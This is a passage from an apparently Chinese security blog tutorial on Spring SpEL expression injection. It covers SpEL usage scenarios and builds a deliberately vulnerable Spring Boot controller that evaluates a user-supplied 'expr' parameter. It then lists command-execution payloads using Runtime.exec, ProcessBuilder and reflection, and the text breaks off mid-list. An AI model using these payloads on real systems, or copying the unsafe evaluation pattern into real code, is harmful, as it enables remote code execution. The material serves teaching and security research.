<li><p><strong>Bean 引用</strong>：<code>@dataSource</code>，<code>@environment.getProperty(&#39;spring.user.name&#39;)</code></p>
<ul>
<li><p>生效前提：<code>EvaluationContext</code> 里配置了 <code>BeanFactoryResolver</code> 指向 Spring <code>ApplicationContext</code></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.setBeanResolver(<span class="keyword">new</span> <span class="title class_">BeanFactoryResolver</span>(applicationContext));</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><code>@beanName</code> 解析<strong>不是 SpEL 核心语法自带</strong>；脱离 Spring 或未配置 BeanResolver 会报错。</p>
</li>
</ul>
<h3 id="漏洞场景-1"><a href="#漏洞场景-1" class="headerlink" title="漏洞场景"></a>漏洞场景</h3><p>SpEL 表达式主要有下面三种应用场景：</p>
<ul>
<li><p><strong>配置与 Bean 元数据层</strong>：在 <strong>注解</strong>（如 <code>@Value</code>、<code>@ConditionalOnExpression</code>）或 <strong>XML</strong>（<code>&lt;property value=&quot;#&#123;...&#125;&quot;/&gt;</code>）中写表达式，让容器在<strong>创建 Bean</strong>时把<strong>计算后的结果</strong>注入到字段&#x2F;属性里。</p>
<ul>
<li><p><code>@Value</code> 注解</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:extra.properties&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoCfg</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 读取配置（非 SpEL）。支持默认值：</span></span><br><span class="line">  <span class="meta">@Value(&quot;$&#123;app.user.name:Anonymous&#125;&quot;)</span></span><br><span class="line">  String user;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// SpEL：静态方法</span></span><br><span class="line">  <span class="meta">@Value(&quot;#&#123;T(java.time.Year).now().value&#125;&quot;)</span></span><br><span class="line">  <span class="type">int</span> year;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// SpEL：系统属性 + 空值回退</span></span><br><span class="line">  <span class="meta">@Value(&quot;#&#123;systemProperties[&#x27;os.name&#x27;] ?: &#x27;Unknown-OS&#x27;&#125;&quot;)</span></span><br><span class="line">  String os;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 混用：先 $&#123;&#125; 后 #&#123;&#125;</span></span><br><span class="line">  <span class="meta">@Value(&quot;#&#123;&#x27;Hello, &#x27; + &#x27;$&#123;app.user.name:Anonymous&#125;&#x27;&#125;&quot;)</span></span><br><span class="line">  String greet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>XML（老项目常见）</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;book&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.example.Book&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;&#x27;CTF-&#x27; + T(java.util.UUID).randomUUID()&#125;&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;book.author:Alice&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>扩展注解（Spring Boot&#x2F;Cloud）：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConditionalOnExpression(&quot;#&#123;environment[&#x27;feature.x.enabled&#x27;] == &#x27;true&#x27;&#125;&quot;)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FeatureXConfig</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>该场景下表达式的解析过程为：</p>
<ol>
<li>Spring 先通过 <code>PropertySourcesPlaceholderConfigurer</code> 或 Boot 的自动配置，把 <strong><code>$&#123;...&#125;</code> 占位符</strong>替换为实际字符串。</li>
<li>随后 Bean Post-Processor（例如 <code>AutowiredAnnotationBeanPostProcessor</code> 等）处理注解属性，遇到 <code>#&#123;...&#125;</code> 时交给 <strong>SpEL 引擎</strong>求值。</li>
<li>求值过程会用到容器上下文：<strong>BeanFactory</strong>（解析 <code>@bean</code>）、<strong>TypeLocator</strong>（解析 <code>T()</code> 静态类型）、<strong>系统属性&#x2F;环境变量</strong>等。</li>
<li>求值完毕后把结果赋给字段&#x2F;属性；这个 Bean <strong>必须由容器托管</strong>（直接 <code>new</code> 不会注入）。</li>
</ol>
</li>
<li><p><strong>程序化求值 API</strong>：直接用 <code>SpelExpressionParser / Expression / (Standard|Simple)EvaluationContext</code> 在<strong>运行时</strong>临时计算表达式（例如简易模板、动态选择&#x2F;过滤集合），而不是写在注解&#x2F;XML 里。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><strong>JSP EL</strong>（<code>proprietaryEvaluate</code>）：**通常需要 <code>${...}</code>**（或在 JSF&#x2F;Facelets 里 <code>#{...}</code>）。表达式常写在 JSP 页面里，由容器用 <strong>pageContext</strong>、request&#x2F;session&#x2F;application 作用域去解析。</p>
</li>
<li><p><strong>Spring SpEL</strong>（<code>new SpelExpressionParser().parseExpression(expr).getValue()</code>）：<strong>默认不需要 <code>${}</code>&#x2F;<code>#{}</code><strong>，你直接给 <code>T(...).xxx()</code> 这种</strong>裸表达式</strong>即可；只有当你选择“模板模式”时，才用 <code>#{...}</code> 并传 <code>TemplateParserContext</code>。</p>
<ul>
<li><p><strong>纯表达式</strong>：<strong>不需要</strong> <code>${}</code> 或 <code>#{}</code>，直接把可执行的 SpEL 串丢进去解析。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">v</span> <span class="operator">=</span> parser.parseExpression(<span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>).getValue();</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>模板文本 + 表达式混排</strong>：使用 <code>#{...}</code>，并在解析时<strong>必须</strong>传 <code>new TemplateParserContext()</code> 告诉它是“模板”。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="type">Object</span> <span class="variable">v</span> <span class="operator">=</span> parser.parseExpression(</span><br><span class="line">    <span class="string">&quot;Hello #&#123; &#x27;wo&#x27;.concat(&#x27;rld&#x27;) &#125;&quot;</span>,</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>()</span><br><span class="line">).getValue();       <span class="comment">// → &quot;Hello world&quot;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>

    </div>
  </div>

<p>在这个过程中需要用到下面几个关键类：</p>
<ul>
<li><p><code>SpelExpressionParser</code>：解析器</p>
</li>
<li><p><code>Expression</code>：已解析的表达式</p>
</li>
<li><p><code>EvaluationContext</code>：求值上下文</p>
<ul>
<li><p><code>StandardEvaluationContext</code>：<strong>功能强</strong>（可 <code>T()</code>、方法解析等）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardEvaluationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">ctx.setVariable(<span class="string">&quot;x&quot;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> p.parseExpression(<span class="string">&quot;#x * 2 + 1&quot;</span>).getValue(ctx, Integer.class); <span class="comment">// 7</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>SimpleEvaluationContext</code>：<strong>裁剪能力</strong>（只读数据绑定，<strong>更安全</strong>）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionParser</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line"><span class="type">StandardEvaluationContext</span> <span class="variable">ctx</span> <span class="operator">=</span> SimpleEvaluationContext.forReadOnlyDataBinding().build();</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> p.parseExpression(<span class="string">&quot;&#x27;Hello &#x27; + #name&quot;</span>)</span><br><span class="line">              .getValue(ctx, Map.of(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;SpEL&quot;</span>), String.class); <span class="comment">// Hello SpEL</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>框架集成处的表达式</strong>：Spring 各模块提供的<strong>注解参数</strong>支持 SpEL：你在注解里写 <code>#id</code>、<code>#&#123;...&#125;</code> 等，框架在<strong>调用点</strong>用上下文变量（方法参数、<code>Authentication</code> 等）求值。</p>
<p>例如：</p>
<ul>
<li><p>Spring Security</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PreAuthorize(&quot;@bean.can(#userId)&quot;)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>Spring Cache</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Cacheable(value=&quot;u&quot;, key=&quot;#id&quot;)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>Spring Scheduling</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Scheduled(cron = &quot;#&#123;@cronProvider.value&#125;&quot;)</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>Spring Data：<code>@Query</code> 中的</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:#&#123;#param&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<p>实际情况下，一般都是基于上面<strong>程序化求值 API</strong> 的使用场景出现表达式注入漏洞。该场景动态解析表达式的过程为：</p>
<ol>
<li><p>创建解析器</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>解析表达式</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(expr);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>构造上下文 <code>new StandardEvaluationContext()</code></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>(rootObj); <span class="comment">// root 可为 null</span></span><br><span class="line">context.setVariable(<span class="string">&quot;x&quot;</span>, <span class="number">42</span>); <span class="comment">// 可选：注入变量</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>new StandardEvaluationContext(rootObj)</code><ul>
<li><strong>rootObj &#x3D; 根对象</strong>（可选）：表达式里<strong>不加任何前缀</strong>访问的属性&#x2F;方法，默认就从“根对象”开始找。</li>
<li><strong>root 可以是 null</strong>：没有默认“起点对象”，但表达式仍可用变量（<code>#var</code>）、静态类型 <code>T(...)</code>、字面量、集合操作等。</li>
</ul>
</li>
<li><code>context.setVariable(&quot;x&quot;, 42)</code><ul>
<li>向上下文里<strong>放一个命名变量</strong>，表达式中用 <strong><code>#x</code></strong> 访问。</li>
<li>变量跟“根对象的属性”是两条线：<code>#x</code> 永远指变量，<code>x</code>（无 <code>#</code>）先从根对象找同名属性。</li>
</ul>
</li>
</ul>
</li>
<li><p>求值</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression.getValue(context); <span class="comment">// 或指定目标类型：getValue(context, String.class)</span></span><br></pre></td></tr></table></figure></div></li>
</ol>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>调用 <code>expression.getValue()</code> <strong>无参重载</strong>时，SpEL 会使用一个<strong>默认求值上下文</strong>来执行表达式。默认上下文是一个**未裁剪的 <code>StandardEvaluationContext</code>**：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 取表达式求值结果（无参重载）</span></span><br><span class="line"><span class="comment">// 关键点：如果调用方没有显式传入 EvaluationContext，就会走默认上下文（StandardEvaluationContext）</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> <span class="keyword">throws</span> EvaluationException &#123;</span><br><span class="line">    <span class="comment">// compiledAst 是编译后的表达式（如果此前已触发过编译）</span></span><br><span class="line">    <span class="type">CompiledExpression</span> <span class="variable">compiledAst</span> <span class="operator">=</span> <span class="built_in">this</span>.compiledAst;</span><br><span class="line">    <span class="keyword">if</span> (compiledAst != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// [... 这里通常是走已编译表达式的快速路径，省略细节 ...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建表达式求值的状态对象：</span></span><br><span class="line">    <span class="comment">// getEvaluationContext() -&gt; 如果没有外部提供上下文，则懒加载创建一个默认的 StandardEvaluationContext</span></span><br><span class="line">    <span class="comment">// this.configuration 为 SpEL 求值的配置（例如编译模式、自动增长集合等）</span></span><br><span class="line">    <span class="type">ExpressionState</span> <span class="variable">expressionState</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionState</span>(getEvaluationContext(), <span class="built_in">this</span>.configuration);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 真正进行 AST（抽象语法树）求值：从根节点 this.ast 开始，结合 expressionState 执行</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.ast.getValue(expressionState);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在求值结束后检查是否需要触发“编译”（基于使用频率/阈值等），以优化后续调用性能</span></span><br><span class="line">    checkCompile(expressionState);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回求值结果</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回“默认”的求值上下文（当调用方在 getValue(...) 时没有显式给出时使用）</span></span><br><span class="line"><span class="comment"> * 核心：默认就是 StandardEvaluationContext（功能很全、风险也最大）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> EvaluationContext <span class="title function_">getEvaluationContext</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.evaluationContext == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 懒加载：首次调用时才创建</span></span><br><span class="line">        <span class="built_in">this</span>.evaluationContext = <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.evaluationContext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此<strong>仍然允许</strong>：</p>
<ul>
<li><code>T(java.lang.XXX)</code> <strong>静态类型访问</strong>（→ 调 <code>Runtime.getRuntime().exec(...)</code>、读系统属性&#x2F;环境等）</li>
<li>大量内置属性访问器与运算能力</li>
</ul>
<p>所以<strong>即使你没写</strong> <code>new StandardEvaluationContext()</code>，只要把<strong>不可信输入</strong>直接送进 <code>parseExpression(...).getValue()</code>，<strong>依然可能被打</strong>。</p>

    </div>
  </div>

<p>我们可以创建一个 Maven 项目来测试 SpEL 表达式注入。其中目录结构如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">src/</span><br><span class="line">  main/</span><br><span class="line">    java/</span><br><span class="line">      com/</span><br><span class="line">        example/</span><br><span class="line">          speldemo/</span><br><span class="line">            SpelDemoApplication.java      ← 应用入口</span><br><span class="line">            SpELController.java           ← 你的控制器（不安全 PoC）</span><br><span class="line">    resources/</span><br><span class="line">      application.properties</span><br></pre></td></tr></table></figure></div>

<p>首先是 Spring Boot 的启动入口类 <code>SpelDemoApplication</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.speldemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpelDemoApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(SpelDemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后使用下面这个 <code>SpELController</code> 类测试 SpEL 表达式注入：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.speldemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpELController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">spel</span><span class="params">(<span class="meta">@RequestParam(name = &quot;expr&quot;)</span> String cmd)</span> &#123;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(cmd);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> expression.getValue(); <span class="comment">// 默认上下文（危险）</span></span><br><span class="line">        <span class="keyword">return</span> String.valueOf(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 Spring Boot 的外部化配置文件 <code>application.properties</code> 设置监听端口：</p>
<div class="code-container" data-rel="Properties"><figure class="iseeu highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8080</span></span><br></pre></td></tr></table></figure></div>

<p>在 <code>pom.xml</code> 中添加依赖和运行插件：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 继承 Spring Boot 父 POM：统一管理依赖版本（不用你一个个写 &lt;version&gt;） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Boot 2.7.x 线，支持 JDK 8 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Web/REST 基础依赖：包含 Spring MVC + 内置 Tomcat（嵌入式） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Spring Boot 插件：支持 spring-boot:run、本地可执行、repackage 等 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 版本由 parent 管理，这里不必写 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="利用技巧-1"><a href="#利用技巧-1" class="headerlink" title="利用技巧"></a>利用技巧</h2><h3 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h3><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Runtime</span></span><br><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">T(Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ProcessBuilder</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(&#123;<span class="string">&#x27;calc&#x27;</span>&#125;).start()</span><br></pre></td></tr></table></figure></div>

<p>下面是一些简单变换：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 反射调用</span></span><br><span class="line">T(String).getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 同上，需要有上下文环境</span></span><br><span class="line">#<span class="built_in">this</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 